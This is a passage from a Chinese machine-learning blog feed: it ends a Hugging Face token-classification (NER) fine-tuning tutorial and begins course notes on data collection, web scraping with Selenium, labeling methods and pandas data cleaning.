class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> datasets <span class="hljs-keyword">import</span> ClassLabel, <span class="hljs-type">Sequence</span><br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd<br><span class="hljs-keyword">from</span> IPython.display <span class="hljs-keyword">import</span> display, HTML<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show_random_elements</span>(<span class="hljs-params">dataset, num_examples=<span class="hljs-number">10</span></span>):<br>    <span class="hljs-keyword">assert</span> num_examples &lt;= <span class="hljs-built_in">len</span>(dataset), <span class="hljs-string">&quot;Can&#x27;t pick more elements than there are in the dataset.&quot;</span><br>    picks = []<br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(num_examples):<br>        pick = random.randint(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(dataset)-<span class="hljs-number">1</span>)<br>        <span class="hljs-keyword">while</span> pick <span class="hljs-keyword">in</span> picks:<br>            pick = random.randint(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(dataset)-<span class="hljs-number">1</span>)<br>        picks.append(pick)<br>    <br>    df = pd.DataFrame(dataset[picks])<br>    <span class="hljs-keyword">for</span> column, typ <span class="hljs-keyword">in</span> dataset.features.items():<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(typ, ClassLabel):<br>            df[column] = df[column].transform(<span class="hljs-keyword">lambda</span> i: typ.names[i])<br>        <span class="hljs-keyword">elif</span> <span class="hljs-built_in">isinstance</span>(typ, <span class="hljs-type">Sequence</span>) <span class="hljs-keyword">and</span> <span class="hljs-built_in">isinstance</span>(typ.feature, ClassLabel):<br>            df[column] = df[column].transform(<span class="hljs-keyword">lambda</span> x: [typ.feature.names[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> x])<br>    display(HTML(df.to_html()))<br></code></pre></td></tr></table></figure><img src="/2021/09/25/nlp-transformer/nlp-transformer-4/image-20210925160442953.png" class="" title="dataset"><h3 id="预处理数据">预处理数据</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> transformers <span class="hljs-keyword">import</span> AutoTokenizer<br>    <br>tokenizer = AutoTokenizer.from_pretrained(model_checkpoint)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#  查看所有预训练模型对应的tokenizer所拥有的特点</span><br><span class="hljs-keyword">import</span> transformers<br><span class="hljs-keyword">assert</span> <span class="hljs-built_in">isinstance</span>(tokenizer, transformers.PreTrainedTokenizerFast)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">tokenizer(<span class="hljs-string">&quot;Hello, this is one sentence!&quot;</span>)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#  输出结果</span><br>&#123;<span class="hljs-string">&#x27;input_ids&#x27;</span>: [<span class="hljs-number">101</span>, <span class="hljs-number">7592</span>, <span class="hljs-number">1010</span>, <span class="hljs-number">2023</span>, <span class="hljs-number">2003</span>, <span class="hljs-number">2028</span>, <span class="hljs-number">6251</span>, <span class="hljs-number">999</span>, <span class="hljs-number">102</span>], <span class="hljs-string">&#x27;attention_mask&#x27;</span>: [<span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>]&#125;<br></code></pre></td></tr></table></figure><p>transformer预训练模型在预训练的时候通常使用的是subword，如果我们的文本输入已经被切分成了word，那么这些word还会被我们的tokenizer继续切分。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">example = datasets[<span class="hljs-string">&quot;train&quot;</span>][<span class="hljs-number">4</span>]<br><span class="hljs-built_in">print</span>(example[<span class="hljs-string">&quot;tokens&quot;</span>])<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">[<span class="hljs-string">&#x27;Germany&#x27;</span>, <span class="hljs-string">&quot;&#x27;s&quot;</span>, <span class="hljs-string">&#x27;representative&#x27;</span>, <span class="hljs-string">&#x27;to&#x27;</span>, <span class="hljs-string">&#x27;the&#x27;</span>, <span class="hljs-string">&#x27;European&#x27;</span>, <span class="hljs-string">&#x27;Union&#x27;</span>, <span class="hljs-string">&quot;&#x27;s&quot;</span>, <span class="hljs-string">&#x27;veterinary&#x27;</span>, <span class="hljs-string">&#x27;committee&#x27;</span>, <span class="hljs-string">&#x27;Werner&#x27;</span>, <span class="hljs-string">&#x27;Zwingmann&#x27;</span>, <span class="hljs-string">&#x27;said&#x27;</span>, <span class="hljs-string">&#x27;on&#x27;</span>, <span class="hljs-string">&#x27;Wednesday&#x27;</span>, <span class="hljs-string">&#x27;consumers&#x27;</span>, <span class="hljs-string">&#x27;should&#x27;</span>, <span class="hljs-string">&#x27;buy&#x27;</span>, <span class="hljs-string">&#x27;sheepmeat&#x27;</span>, <span class="hljs-string">&#x27;from&#x27;</span>, <span class="hljs-string">&#x27;countries&#x27;</span>, <span class="hljs-string">&#x27;other&#x27;</span>, <span class="hljs-string">&#x27;than&#x27;</span>, <span class="hljs-string">&#x27;Britain&#x27;</span>, <span class="hljs-string">&#x27;until&#x27;</span>, <span class="hljs-string">&#x27;the&#x27;</span>, <span class="hljs-string">&#x27;scientific&#x27;</span>, <span class="hljs-string">&#x27;advice&#x27;</span>, <span class="hljs-string">&#x27;was&#x27;</span>, <span class="hljs-string">&#x27;clearer&#x27;</span>, <span class="hljs-string">&#x27;.&#x27;</span>]<br><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">tokenized_input = tokenizer(example[<span class="hljs-string">&quot;tokens&quot;</span>], is_split_into_words=<span class="hljs-literal">True</span>)<br>tokens = tokenizer.convert_ids_to_tokens(tokenized_input[<span class="hljs-string">&quot;input_ids&quot;</span>])<br><span class="hljs-built_in">print</span>(tokens)<br></code></pre></td></tr></table></figure><p>单词"Zwingmann" 和 "sheepmeat"继续被切分成了3个subtokens。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">[<span class="hljs-string">&#x27;[CLS]&#x27;</span>, <span class="hljs-string">&#x27;germany&#x27;</span>, <span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-string">&#x27;representative&#x27;</span>, <span class="hljs-string">&#x27;to&#x27;</span>, <span class="hljs-string">&#x27;the&#x27;</span>, <span class="hljs-string">&#x27;european&#x27;</span>, <span class="hljs-string">&#x27;union&#x27;</span>, <span class="hljs-string">&quot;&#x27;&quot;</span>, <span class="hljs-string">&#x27;s&#x27;</span>, <span class="hljs-string">&#x27;veterinary&#x27;</span>, <span class="hljs-string">&#x27;committee&#x27;</span>, <span class="hljs-string">&#x27;werner&#x27;</span>, <span class="hljs-string">&#x27;z&#x27;</span>, <span class="hljs-string">&#x27;##wing&#x27;</span>, <span class="hljs-string">&#x27;##mann&#x27;</span>, <span class="hljs-string">&#x27;said&#x27;</span>, <span class="hljs-string">&#x27;on&#x27;</span>, <span class="hljs-string">&#x27;wednesday&#x27;</span>, <span class="hljs-string">&#x27;consumers&#x27;</span>, <span class="hljs-string">&#x27;should&#x27;</span>, <span class="hljs-string">&#x27;buy&#x27;</span>, <span class="hljs-string">&#x27;sheep&#x27;</span>, <span class="hljs-string">&#x27;##me&#x27;</span>, <span class="hljs-string">&#x27;##at&#x27;</span>, <span class="hljs-string">&#x27;from&#x27;</span>, <span class="hljs-string">&#x27;countries&#x27;</span>, <span class="hljs-string">&#x27;other&#x27;</span>, <span class="hljs-string">&#x27;than&#x27;</span>, <span class="hljs-string">&#x27;britain&#x27;</span>, <span class="hljs-string">&#x27;until&#x27;</span>, <span class="hljs-string">&#x27;the&#x27;</span>, <span class="hljs-string">&#x27;scientific&#x27;</span>, <span class="hljs-string">&#x27;advice&#x27;</span>, <span class="hljs-string">&#x27;was&#x27;</span>, <span class="hljs-string">&#x27;clearer&#x27;</span>, <span class="hljs-string">&#x27;.&#x27;</span>, <span class="hljs-string">&#x27;[SEP]&#x27;</span>]<br></code></pre></td></tr></table></figure><p>由于标注数据通常是在word级别进行标注的，既然word还会被切分成subtokens，那么意味着我们还需要对标注数据进行subtokens的对齐。同时，由于预训练模型输入格式的要求，往往还需要加上一些特殊符号比如：<code>[CLS]</code> 和 <code>[SEP]</code>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">len</span>(example[<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;task&#125;</span>_tags&quot;</span>]), <span class="hljs-built_in">len</span>(tokenized_input[<span class="hljs-string">&quot;input_ids&quot;</span>])<br><br>(<span class="hljs-number">31</span>, <span class="hljs-number">39</span>)<br></code></pre></td></tr></table></figure><p>tokenizer有一个<code>word_ids</code>方法可以帮助我们解决这个问题。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-built_in">print</span>(tokenized_input.word_ids())<br><br>[<span class="hljs-literal">None</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>, <span class="hljs-number">10</span>, <span class="hljs-number">11</span>, <span class="hljs-number">11</span>, <span class="hljs-number">11</span>, <span class="hljs-number">12</span>, <span class="hljs-number">13</span>, <span class="hljs-number">14</span>, <span class="hljs-number">15</span>, <span class="hljs-number">16</span>, <span class="hljs-number">17</span>, <span class="hljs-number">18</span>, <span class="hljs-number">18</span>, <span class="hljs-number">18</span>, <span class="hljs-number">19</span>, <span class="hljs-number">20</span>, <span class="hljs-number">21</span>, <span class="hljs-number">22</span>, <span class="hljs-number">23</span>, <span class="hljs-number">24</span>, <span class="hljs-number">25</span>, <span class="hljs-number">26</span>, <span class="hljs-number">27</span>, <span class="hljs-number">28</span>, <span class="hljs-number">29</span>, <span class="hljs-number">30</span>, <span class="hljs-literal">None</span>]<br><br></code></pre></td></tr></table></figure><p>我们可以看到，word_ids将每一个subtokens位置都对应了一个word的下标。比如第1个位置对应第0个word，然后第2、3个位置对应第1个word。特殊字符对应了None。有了这个list，我们就能将subtokens和words还有标注的labels对齐啦。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">word_ids = tokenized_input.word_ids()<br>aligned_labels = [-<span class="hljs-number">100</span> <span class="hljs-keyword">if</span> i <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span> <span class="hljs-keyword">else</span> example[<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;task&#125;</span>_tags&quot;</span>][i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> word_ids]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">len</span>(aligned_labels), <span class="hljs-built_in">len</span>(tokenized_input[<span class="hljs-string">&quot;input_ids&quot;</span>]))<br></code></pre></td></tr></table></figure><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">39 </span><span class="hljs-number">39</span><br></code></pre></td></tr></table></figure><p>我们通常将特殊字符的label设置为-100，在模型中-100通常会被忽略掉不计算loss。</p><p>我们有两种对齐label的方式：</p><ul><li>多个subtokens对齐一个word，对齐一个label</li><li>多个subtokens的第一个subtoken对齐word，对齐一个label，其他subtokens直接赋予-100.</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 我们提供这两种方式，通过label_all_tokens = True切换。</span><br>label_all_tokens = <span class="hljs-literal">True</span><br></code></pre></td></tr></table></figure><p>预处理函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">tokenize_and_align_labels</span>(<span class="hljs-params">examples</span>):<br>    tokenized_inputs = tokenizer(examples[<span class="hljs-string">&quot;tokens&quot;</span>], truncation=<span class="hljs-literal">True</span>, is_split_into_words=<span class="hljs-literal">True</span>)<br><br>    labels = []<br>    <span class="hljs-keyword">for</span> i, label <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(examples[<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;task&#125;</span>_tags&quot;</span>]):<br>        word_ids = tokenized_inputs.word_ids(batch_index=i)<br>        previous_word_idx = <span class="hljs-literal">None</span><br>        label_ids = []<br>        <span class="hljs-keyword">for</span> word_idx <span class="hljs-keyword">in</span> word_ids:<br>            <span class="hljs-comment"># Special tokens have a word id that is None. We set the label to -100 so they are automatically</span><br>            <span class="hljs-comment"># ignored in the loss function.</span><br>            <span class="hljs-keyword">if</span> word_idx <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>                label_ids.append(-<span class="hljs-number">100</span>)<br>            <span class="hljs-comment"># We set the label for the first token of each word.</span><br>            <span class="hljs-keyword">elif</span> word_idx != previous_word_idx:<br>                label_ids.append(label[word_idx])<br>            <span class="hljs-comment"># For the other tokens in a word, we set the label to either the current label or -100, depending on</span><br>            <span class="hljs-comment"># the label_all_tokens flag.</span><br>            <span class="hljs-keyword">else</span>:<br>                label_ids.append(label[word_idx] <span class="hljs-keyword">if</span> label_all_tokens <span class="hljs-keyword">else</span> -<span class="hljs-number">100</span>)<br>            previous_word_idx = word_idx<br><br>        labels.append(label_ids)<br><br>    tokenized_inputs[<span class="hljs-string">&quot;labels&quot;</span>] = labels<br>    <span class="hljs-keyword">return</span> tokenized_inputs<br></code></pre></td></tr></table></figure><p>接下来对数据集datasets里面的所有样本进行预处理，处理的方式是使用map函数，将预处理函数prepare_train_features应用到（map)所有样本上。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">tokenized_datasets = datasets.<span class="hljs-built_in">map</span>(tokenize_and_align_labels, batched=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><h3 id="微调预训练模型-1">微调预训练模型</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> transformers <span class="hljs-keyword">import</span> AutoModelForTokenClassification, TrainingArguments, Trainer<br><br>model = AutoModelForTokenClassification.from_pretrained(model_checkpoint, num_labels=<span class="hljs-built_in">len</span>(label_list))  <span class="hljs-comment"># 预训练模型</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#  定义模型所需要的参数</span><br>args = TrainingArguments(<br>    <span class="hljs-string">f&quot;test-<span class="hljs-subst">&#123;task&#125;</span>&quot;</span>,<br>    evaluation_strategy = <span class="hljs-string">&quot;epoch&quot;</span>,<br>    learning_rate=<span class="hljs-number">2e-5</span>,<br>    per_device_train_batch_size=batch_size,<br>    per_device_eval_batch_size=batch_size,<br>    num_train_epochs=<span class="hljs-number">3</span>,<br>    weight_decay=<span class="hljs-number">0.01</span>,<br>)<br></code></pre></td></tr></table></figure><p>最后我们需要一个数据收集器datacollator，将我们处理好的输入喂给模型。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> transformers <span class="hljs-keyword">import</span> DataCollatorForTokenClassification<br><br>data_collator = DataCollatorForTokenClassification(tokenizer)<br></code></pre></td></tr></table></figure><p>我们使用<ahref="https://github.com/chakki-works/seqeval"><code>seqeval</code></a>metric来完成评估。将模型预测送入评估之前，我们也会做一些数据后处理：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#模型评估</span><br>metric = load_metric(<span class="hljs-string">&quot;seqeval&quot;</span>)<br>labels = [label_list[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> example[<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;task&#125;</span>_tags&quot;</span>]]<br>metric.compute(predictions=[labels], references=[labels])<br></code></pre></td></tr></table></figure><p>对模型预测结果做一些后处理：</p><ul><li>选择预测分类最大概率的下标</li><li>将下标转化为label</li><li>忽略-100所在地方</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">compute_metrics</span>(<span class="hljs-params">p</span>):<br>    predictions, labels = p<br>    predictions = np.argmax(predictions, axis=<span class="hljs-number">2</span>)<br><br>    <span class="hljs-comment"># Remove ignored index (special tokens)</span><br>    true_predictions = [<br>        [label_list[p] <span class="hljs-keyword">for</span> (p, l) <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(prediction, label) <span class="hljs-keyword">if</span> l != -<span class="hljs-number">100</span>]<br>        <span class="hljs-keyword">for</span> prediction, label <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(predictions, labels)<br>    ]<br>    true_labels = [<br>        [label_list[l] <span class="hljs-keyword">for</span> (p, l) <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(prediction, label) <span class="hljs-keyword">if</span> l != -<span class="hljs-number">100</span>]<br>        <span class="hljs-keyword">for</span> prediction, label <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(predictions, labels)<br>    ]<br><br>    results = metric.compute(predictions=true_predictions, references=true_labels)<br>    <span class="hljs-keyword">return</span> &#123;<br>        <span class="hljs-string">&quot;precision&quot;</span>: results[<span class="hljs-string">&quot;overall_precision&quot;</span>],<br>        <span class="hljs-string">&quot;recall&quot;</span>: results[<span class="hljs-string">&quot;overall_recall&quot;</span>],<br>        <span class="hljs-string">&quot;f1&quot;</span>: results[<span class="hljs-string">&quot;overall_f1&quot;</span>],<br>        <span class="hljs-string">&quot;accuracy&quot;</span>: results[<span class="hljs-string">&quot;overall_accuracy&quot;</span>],<br>    &#125;<br></code></pre></td></tr></table></figure><p>将数据，模型，参数传入<code>Trainer</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">trainer = Trainer(<br>    model,<br>    args,<br>    train_dataset=tokenized_datasets[<span class="hljs-string">&quot;train&quot;</span>],<br>    eval_dataset=tokenized_datasets[<span class="hljs-string">&quot;validation&quot;</span>],<br>    data_collator=data_collator,<br>    tokenizer=tokenizer,<br>    compute_metrics=compute_metrics<br>)<br></code></pre></td></tr></table></figure><p>开始训练</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">trainer.train()<br></code></pre></td></tr></table></figure><p>我们可以再次使用<code>evaluate</code>方法评估，可以评估其他数据集。</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">trainer<span class="hljs-selector-class">.evaluate</span>()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>深度学习</category>
      
      <category>自然语言处理</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Datawhale组队学习</tag>
      
      <tag>NLP入门</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>实用机器学习(一)</title>
    <link href="/2021/09/21/practical-machine-learning/practical-machine-learning-1/"/>
    <url>/2021/09/21/practical-machine-learning/practical-machine-learning-1/</url>
    
    <content type="html"><![CDATA[<p><strong><em>本文为学习李沐2021斯坦福秋季课程《实用机器学习》时所做的笔记，仅供学习复习回顾，不作任何商业用途，详细信息请访问<ahref="https://space.bilibili.com/1567748478">跟李沐学AI</a></em></strong></p><h1 id="课程介绍">课程介绍</h1><p>机器学习工作流程</p><img src="/2021/09/21/practical-machine-learning/practical-machine-learning-1/image-20210921165637795.png" class="" title="ML Workflow"><img src="/2021/09/21/practical-machine-learning/practical-machine-learning-1/image-20210921165812892.png" class="" title="image-20210921165812892"><img src="/2021/09/21/practical-machine-learning/practical-machine-learning-1/image-20210921165812973.png" class="" title="ML Workflow"><span id="more"></span><h1 id="数据获取">数据获取</h1><img src="/2021/09/21/practical-machine-learning/practical-machine-learning-1/image-20210922201024824.png" class="" title="数据获取"><p>寻找数据集的一些网站</p><p><a href="https://paperswithcode.com/sota">Papers With Code</a>论文复现代码以及用到的一些数据集</p><p><a href="https://www.kaggle.com/datasets">Kaggle Datasets</a>Kaggle竞赛平台</p><p><a href="https://gas.graviti.cn/open-datasets">Graviti 格物钛</a>国内数据集收集平台</p><p>各大框架的开源数据集，各类比赛的数据集等等。</p><h2 id="数据融合">数据融合</h2><p>收集的数据集并不一定能够完全满足当前训练数据的要求，要根据数据情况对收集的数据进行一定的融合，处理。对于<strong>0</strong>值或者<strong>NaN</strong>等特殊数据，要进行处理。</p><img src="/2021/09/21/practical-machine-learning/practical-machine-learning-1/image-20210922202600100.png" class="" title="data intergration"><h2 id="数据生成">数据生成</h2><p>在无法找到足够的数据集的情况下，我们可以去生成相应的数据集。使用<strong>GANs</strong>去增大数据集体量，也可以通过<strong>数据增强</strong>，来增多我们的数据集。例如在CV问题中，我们经常使用对图像的裁剪，旋转，拉伸来增强我们的数据集。</p><img src="/2021/09/21/practical-machine-learning/practical-machine-learning-1/image-20210922203152721.png" class="" title="数据增强"><h2 id="网页数据抓取">网页数据抓取</h2><h3 id="网页抓取工具">网页抓取工具</h3><p>凭借python工具，通过一个带浏览器表示的url请求，来向web网站抓取数据。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> selenium <span class="hljs-keyword">import</span> webdriver<br>chrome_options = webdriver.ChromeOptions()<br>chrome_optinos.headless = <span class="hljs-literal">True</span>  <span class="hljs-comment"># 通过添加浏览器标识，可以减少网站对于爬虫的反爬限制，但同一IP地址短时间发起多个请求时，依旧会被认为异常行为</span><br>chrome = webdriver.Chrome(chrome_options=chrome_options)<br><br>page = chrome.get(url)<br></code></pre></td></tr></table></figure><h3 id="legal-consideration">Legal Consideration</h3><p><strong>虽然我们只是出于学习的目的去收集数据，但我们绝对不能去侵害别人的隐私信息！！！</strong></p><h2 id="数据标注">数据标注</h2><p>是否有足够多的标注的数据，根据标注数据的数量来选择下一步来进行学习的模型。</p><img src="/2021/09/21/practical-machine-learning/practical-machine-learning-1/image-20210925163352042.png" class="" title="数据标注"><h3 id="半监督学习">半监督学习</h3><ul><li>只有少量被标注的数据，大量未被标注的数据</li><li>对数据分布做出假设，以此来使用为标注的数据<ul><li>连续性假设：特征相同的数据往往标注类型相同</li><li>聚类假设：同一类数据的标注相同</li><li>流型假设：数据内在复杂性，往往比数据本身维度要低</li></ul></li></ul><h3 id="自学习算法">自学习算法</h3><img src="/2021/09/21/practical-machine-learning/practical-machine-learning-1/image-20210925164551600.png" class="" title="self-training"><h3 id="通过众包进行标注">通过众包进行标注</h3><p>将数据标注任务通过众包方式来进行数据标注。</p><p>众包方式进行的数据标注任务，需要考虑数据标注的难度，成本。</p><h3 id="active-learning">Active Learning</h3><ul><li>与半监督学习相似，但会有人的干预，认为选择关注的数据</li><li>Uncertainty sampling选择那些最不确信的数据进行学习</li><li>多个模型进行投票预测</li></ul><img src="/2021/09/21/practical-machine-learning/practical-machine-learning-1/image-20210925170152038.png" class="" title="active learning + self-training"><h3 id="质量控制">质量控制</h3><p>众包数据标注者的质量不能保证高质量，需要对最终的质量进行确定。</p><h3 id="弱监督学习">弱监督学习</h3><ul><li>自动生成标注</li><li>数据编程</li></ul><h1 id="数据处理">数据处理</h1><h2 id="探索性数据分析">探索性数据分析</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> numpy <span class="hljs-keyword">as</span> np<br><span class="hljs-keyword">import</span> pandas <span class="hljs-keyword">as</span> pd<br><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt<br><span class="hljs-keyword">import</span> seaborn <span class="hljs-keyword">as</span> sns<br><span class="hljs-keyword">from</span> IPython <span class="hljs-keyword">import</span> display<br>display.set_matplotlib_formats(<span class="hljs-string">&#x27;svg&#x27;</span>)<br><br>data = pd.read_csv(<span class="hljs-string">&#x27;house_sales.zip&#x27;</span>)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">null_sum = data.isnull().<span class="hljs-built_in">sum</span>()<br>data.columns[null_sum &lt; <span class="hljs-built_in">len</span>(data) * <span class="hljs-number">0.3</span>]  <span class="hljs-comment"># columns will keep</span><br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">data.drop(columns=data.columns[null_sum &gt; <span class="hljs-built_in">len</span>(data) * <span class="hljs-number">0.3</span>], inplace=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 查看数据类型是否正确</span><br>data.dtypes<br></code></pre></td></tr></table></figure><img src="/2021/09/21/practical-machine-learning/practical-machine-learning-1/image-20211014201624054.png" class="" title="data types"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 对数据进行转化</span><br>currency = [<span class="hljs-string">&#x27;Sold Price&#x27;</span>, <span class="hljs-string">&#x27;Listed Price&#x27;</span>, <span class="hljs-string">&#x27;Tax assessed value&#x27;</span>, <span class="hljs-string">&#x27;Annual tax amount&#x27;</span>]<br><span 